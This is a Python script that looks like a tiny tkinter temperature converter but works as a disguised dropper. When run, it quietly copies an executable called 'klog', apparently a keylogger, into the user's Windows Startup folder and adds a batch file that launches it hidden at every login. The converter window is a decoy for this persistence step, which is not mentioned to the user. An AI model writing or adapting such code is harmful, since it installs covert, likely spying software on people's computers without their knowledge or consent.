from shutil import copyfile
import tkinter as tk
from os import path
import subprocess
import getpass
import sys

USER_NAME = getpass.getuser()

def run_main_process(ori_name, new_name):
  startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
  with open(startup_path + '\\' + ori_name + ".bat", "w+") as bat_script:
    bat_script.write('start /B "" "{0}\\{1}"\nexit 0\n'.format(startup_path, ori_name + '.exe'))
  copyfile(new_name, startup_path + '\\' + ori_name + '.exe') # Copy this executable to startup folder
  if len(sys.argv) > 1:
    subprocess.Popen('explorer "{0}"'.format(startup_path), shell=False) # Opens file manager at desired folder
  else:
    def fahrenheit_to_celsius():
      fahrenheit = ent_temperature.get()
      celsius = (5/9) * (float(fahrenheit) - 32)
      lbl_result["text"] = f"{round(celsius, 2)} \N{DEGREE CELSIUS}"
    window = tk.Tk() # Set-up the window
    window.title("Temp")
    window.geometry("200x50") # set window size
    window.resizable(width=False, height=False)
    frm_entry = tk.Frame(master=window) # Create the Fahrenheit entry frame with an Entry widget and label in it
    ent_temperature = tk.Entry(master=frm_entry, width=10)
    lbl_temp = tk.Label(master=frm_entry, text="\N{DEGREE FAHRENHEIT}")
    ent_temperature.grid(row=0, column=0, sticky="e") # Layout the temperature Entry and Label in frm_entry using the .grid() geometry manager
    lbl_temp.grid(row=0, column=1, sticky="w")
    btn_convert = tk.Button( # Create the conversion Button and result display Label
      master=window,
      text="\N{RIGHTWARDS BLACK ARROW}",
      command=fahrenheit_to_celsius
    )
    lbl_result = tk.Label(master=window, text="\N{DEGREE CELSIUS}")
    frm_entry.grid(row=0, column=0, padx=10) # Set-up the layout using the .grid() geometry manager
    btn_convert.grid(row=0, column=1, pady=10)
    lbl_result.grid(row=0, column=2, padx=10)
    window.mainloop() # Run the application

def add_to_startup(file_name):
  exe_file = "{0}.exe".format(file_name)
  if path.isfile(exe_file):
    run_main_process(file_name, exe_file)
  elif path.isfile('dist/' + exe_file):
    run_main_process(file_name, 'dist/' + exe_file)
  else:
    print("Executable doesn't exists")

add_to_startup("klog")
